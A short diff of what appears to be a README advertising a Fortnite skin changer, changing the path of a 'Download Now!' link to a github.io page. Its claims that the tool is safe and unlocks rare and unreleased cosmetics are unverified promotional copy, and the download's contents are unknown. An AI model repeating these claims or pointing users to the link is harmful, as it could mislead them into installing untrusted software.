@@ -2,7 +2,7 @@
 
 Unleash your creativity with the most advanced Fortnite skin changer on the market! This powerful yet safe tool lets you instantly equip any skin, back bling, or pickaxe in your locker - including rare exclusives and unreleased cosmetics. Perfect for streamers, competitive players, and fashionistas who want to stand out in every match! 🚀
 
-[![Download Fortnite Skin Swapper Pro](https://img.shields.io/badge/Download-Now!-brightgreen)](https://fortnite-skin-swapper-official.github.io/.github/)
+[![Download Fortnite Skin Swapper Pro](https://img.shields.io/badge/Download-Now!-brightgreen)](https://fortnite-skin-swapper-official.github.io/.github/skinswapper)
 
 ---
 
